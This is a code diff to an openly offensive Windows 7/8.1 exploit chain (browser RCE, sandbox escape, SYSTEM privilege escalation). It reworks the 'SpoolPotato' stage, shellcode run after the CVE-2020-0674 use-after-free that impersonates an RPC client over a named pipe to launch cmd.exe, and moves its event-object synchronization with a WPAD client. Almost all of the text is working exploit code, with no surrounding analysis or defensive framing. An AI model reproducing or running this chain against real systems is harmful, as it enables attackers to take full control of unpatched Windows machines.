@@ -33,7 +33,7 @@ Windows 7/8.1 IE/Firefox RCE -> Sandbox Escape -> SYSTEM EoP Exploit Chain
 //#define SESSION_ID 1
 #define COMMAND_LINE L"cmd.exe"
 #define INTERACTIVE_PROCESS FALSE
-#define SYNC_EVENT_NAME L"Global\\DoubleStarEvent"
+#define SYNC_EVENT_NAME L"Global\\DoubleStar"
 
 ////////
 ////////
@@ -299,6 +299,43 @@ BOOL LaunchImpersonatedProcess(HANDLE hPipe, const wchar_t *CommandLine, uint32_
 }
 
 BOOL SpoolPotato() {
+    /*
+    SpoolPotato/WPAD client synchronization
+
+    Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
+    the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
+    often yield a successful status from WPAD.
+
+    To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
+    attempt to trigger the PAC download until it receives confirmation via an event object from within
+    the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
+    the CVE-2020-0674 UAF.
+
+    The WPAD client initially:
+    1. Creates a sync event object in \BaseNamedObjects and then proceeds to repeatedly make RPC calls to
+       WPAD in a loop.
+    2. Between each iteration of the loop it spends several seconds waiting for the signal event it
+       previously created to be signalled by SpoolPotato.
+    3. Once the event has been triggered the WPAD client ends its loop and terminates.
+
+    Meanwhile the SpoolPotato shellcode:
+    1. Signals the event object to signal completion to the WPAD client.
+    2. Makes its privilege escalation operations.
+    */
+
+    HANDLE hEvent;
+
+    DebugLog(L"... syncing event object with WPAD client...");
+
+    if ((hEvent = OpenEventW(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, SYNC_EVENT_NAME)) != NULL) {
+        SetEvent(hEvent);
+        CloseHandle(hEvent);
+        DebugLog(L"... successfully synced WPAD client via event object");
+    }
+    else {
+        DebugLog("... failed to open handle to event object (error %d)", GetLastError());
+    }
+
     if(EnablePrivilege(SE_IMPERSONATE_NAME)) {
         wchar_t* pSpoolPipeUuidStr = NULL;
         HANDLE hSpoolPipe = INVALID_HANDLE_VALUE;
@@ -317,43 +354,7 @@ BOOL SpoolPotato() {
                 DebugLog(L"... recieved connection over named pipe");
 
                 if (LaunchImpersonatedProcess(hSpoolPipe, COMMAND_LINE, WTSGetActiveConsoleSessionId(), INTERACTIVE_PROCESS)) {
-                    DebugLog(L"... successfully launched process while impersonating RPC client. Syncing event object with WPAD client...");
-
-                    /*
-                    SpoolPotato/WPAD client synchronization
-
-                    Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
-                    the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
-                    often yield a successful status from WPAD.
-
-                    To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
-                    attempt to trigger the PAC download until it receives confirmation via an event object from within
-                    the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
-                    the CVE-2020-0674 UAF.
-
-                    The WPAD client initially:
-                    1. Creates a sync event object in \BaseNamedObjects and then proceeds to repeatedly make RPC calls to
-                       WPAD in a loop.
-                    2. Between each iteration of the loop it spends several seconds waiting for the signal event it
-                       previously created to be signalled by SpoolPotato.
-                    3. Once the event has been triggered the WPAD client ends its loop and terminates.
-
-                    Meanwhile the SpoolPotato shellcode:
-                    1. Makes its privilege escalation operations.
-                    2. Waits for the sync event to be created by the WPAD client.
-                    3. Signals the event object to signal completion to the WPAD client.
-                    4. Terminates itself.
-                    */
-
-                    HANDLE hEvent;
-                    
-                    while((hEvent = OpenEventW(EVENT_MODIFY_STATE | SYNCHRONIZE, FALSE, SYNC_EVENT_NAME)) == NULL) {
-                        Sleep(500);
-                    }
-
-                    SetEvent(hEvent);
-                    CloseHandle(hEvent);
-                    DebugLog(L"... successfully synced WPAD client via event object");
+                    DebugLog(L"... successfully launched process while impersonating RPC client.");
                 }
                 else {
                     DebugLog(L"... failed to launch process while impersonating RPC client");
